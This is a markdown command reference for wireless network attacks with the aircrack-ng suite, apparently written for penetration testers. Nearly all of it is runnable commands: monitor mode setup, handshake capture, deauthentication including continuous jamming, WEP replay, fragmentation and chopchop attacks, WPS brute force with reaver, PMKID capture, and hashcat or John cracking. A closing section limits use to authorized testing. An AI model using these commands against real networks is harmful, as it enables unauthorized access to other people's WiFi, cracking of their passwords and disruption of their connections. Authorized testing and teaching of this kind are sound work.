# Advanced Aircrack-ng Commands 📡

## 🎯 Purpose
Command reference for the classic aircrack-ng suite workflow — monitor mode, handshake/PMKID capture, and WEP/WPA/WPS attacks using `airmon-ng`/`airodump-ng`/`aireplay-ng`/`aircrack-ng` themselves. This is the full-suite counterpart to [hcxtoolshashcat.md](hcxtoolshashcat.md), which covers only the newer hcxdumptool/hcxtools capture pipeline.

## ⚙️ Function
Linear workflow from monitor-mode setup through capture to cracking, plus a reference block of advanced `airodump-ng`/`aireplay-ng` flags. Differs from `hcxtoolshashcat.md` in that it requires monitor mode and covers WEP and WPS attacks (`reaver`, ARP replay, fragmentation/chopchop) that the hcxdumptool pipeline doesn't touch; it overlaps with that file only in the PMKID-capture step, which now defers to hcxtools since aircrack-ng itself has no native PMKID capture.

## 🏆 Goal
Get from a stock WiFi adapter to a cracked WEP key or a WPA/WPA2 handshake/PMKID hash ready for offline cracking, using only the aircrack-ng suite plus hashcat/John for the cracking step.

## 📋 When to Use
- Authorized WiFi penetration tests requiring the classic monitor-mode workflow (WEP, WPS, or handshake-based WPA/WPA2 attacks)
- Any engagement where hcxdumptool's clientless capture isn't applicable and a full deauth-and-capture cycle is needed
- Reference lookup for specific `airodump-ng`/`aireplay-ng` flags

### Basic Workflow

**1. Enable Monitor Mode**
```bash
sudo airmon-ng check kill          # Kill interfering processes
sudo airmon-ng start wlan1         # Enable monitor mode
```

**2. Scan for Networks**
```bash
sudo airodump-ng wlan1mon          # Scan all channels
sudo airodump-ng -c 6 --bssid XX:XX:XX:XX:XX:XX wlan1mon  # Target specific AP
```

**3. Capture Handshakes**
```bash
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan1mon
```

**4. Deauth Attack (Force Handshake)**
```bash
sudo aireplay-ng --deauth 10 -a AA:BB:CC:DD:EE:FF wlan1mon          # Deauth all clients
sudo aireplay-ng --deauth 10 -a AA:BB:CC:DD:EE:FF -c CLIENT:MAC wlan1mon  # Target specific client
```

### Advanced Techniques

**WPA/WPA2 Cracking**
```bash
# Dictionary attack
aircrack-ng -w /path/to/wordlist.txt -b AA:BB:CC:DD:EE:FF capture-01.cap

# With ESSID filter
aircrack-ng -w wordlist.txt -e "NetworkName" capture-01.cap

# Using multiple CPU cores
aircrack-ng -w wordlist.txt capture-01.cap -p 4
```

**WEP Cracking**
```bash
# Fake authentication
sudo aireplay-ng --fakeauth 0 -a AA:BB:CC:DD:EE:FF -h YOUR:MAC wlan1mon

# ARP replay attack
sudo aireplay-ng --arpreplay -b AA:BB:CC:DD:EE:FF -h YOUR:MAC wlan1mon

# Crack WEP key
aircrack-ng capture-01.cap
```

**WPS Attacks**
```bash
# Scan for WPS-enabled networks
sudo wash -i wlan1mon

# Reaver attack (online brute force)
sudo reaver -i wlan1mon -b AA:BB:CC:DD:EE:FF -vv

# Pixie dust attack (offline)
sudo reaver -i wlan1mon -b AA:BB:CC:DD:EE:FF -vv -K
```

**PMKID Attack (No Clients Needed)**
```bash
# Capture PMKID
sudo hcxdumptool -i wlan1mon -o pmkid.pcapng --enable_status=1

# Convert to hashcat format (hcxpcaptool is deprecated; use hcxpcapngtool)
hcxpcapngtool -o pmkid.22000 pmkid.pcapng

# Crack with hashcat (unified 22000 format, replaces deprecated mode 16800)
hashcat -m 22000 pmkid.22000 wordlist.txt
```
*(See [hcxtoolshashcat.md](hcxtoolshashcat.md) for the full hcxdumptool/hcxtools capture workflow — this is a shortcut reference, not the complete pipeline.)*

**Airodump-ng Advanced Options**
```bash
# Capture only handshakes (WPA)
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture --output-format pcap wlan1mon

# Show manufacturers
sudo airodump-ng --manufacturer wlan1mon

# Focus on 5GHz band
sudo airodump-ng --band a wlan1mon

# Show only WPA networks
sudo airodump-ng --encrypt wpa wlan1mon
```

**Aireplay-ng Advanced Options**
```bash
# Continuous deauth (jamming)
sudo aireplay-ng --deauth 0 -a AA:BB:CC:DD:EE:FF wlan1mon

# Interactive packet replay
sudo aireplay-ng --interactive wlan1mon

# Fragmentation attack
sudo aireplay-ng --fragment -b AA:BB:CC:DD:EE:FF -h YOUR:MAC wlan1mon

# Chopchop attack
sudo aireplay-ng --chopchop -b AA:BB:CC:DD:EE:FF -h YOUR:MAC wlan1mon
```

**Converting Capture Files**
```bash
# Modern path: convert directly to the unified hashcat 22000 format
hcxpcapngtool -o output.22000 capture-01.cap

# Legacy path: cap2hccapx (from hashcat-utils) for the old hccapx format / mode 2500 workflow
cap2hccapx.bin capture-01.cap output.hccapx

# Merge multiple capture files
mergecap -w merged.cap capture-*.cap

# Clean/filter capture file
wpaclean cleaned.cap capture-01.cap
```

**Cracking with External Tools**
```bash
# Hashcat WPA/WPA2/WPA3 — recommended unified mode (replaces deprecated 2500/16800)
hashcat -m 22000 output.22000 wordlist.txt

# Hashcat with rules
hashcat -m 22000 output.22000 wordlist.txt -r rules/best64.rule

# Legacy hccapx workflow (mode 2500) still works but is deprecated by hashcat upstream
hashcat -m 2500 capture.hccapx wordlist.txt

# John the Ripper
hccap2john capture.hccap > hash.txt
john --wordlist=wordlist.txt hash.txt
```
****

## Additional Resources 📚

**Documentation**
- Aircrack-ng: https://www.aircrack-ng.org/documentation.html
- Hashcat: https://hashcat.net/wiki/

---

## Security and Ethical Considerations ⚠️

**IMPORTANT**: These tools are for **authorized security testing only**. Unauthorized use is illegal.

* **Marauder Use:** Get **written permission** before testing any network. Only test networks you own or have explicit authorization to test.
* **Cracking Use:** All cracking attempts (Hashcat) must be done in an **isolated lab environment** against hashes you are authorized to possess.
* **Legal Compliance:** Strictly comply with all local laws and regulations.

**Legal Use Cases:**
* Penetration testing with client authorization.
* Testing your own home or lab network security.
* Security research in isolated lab environments.

---

*Last Updated: 2025-11-03*
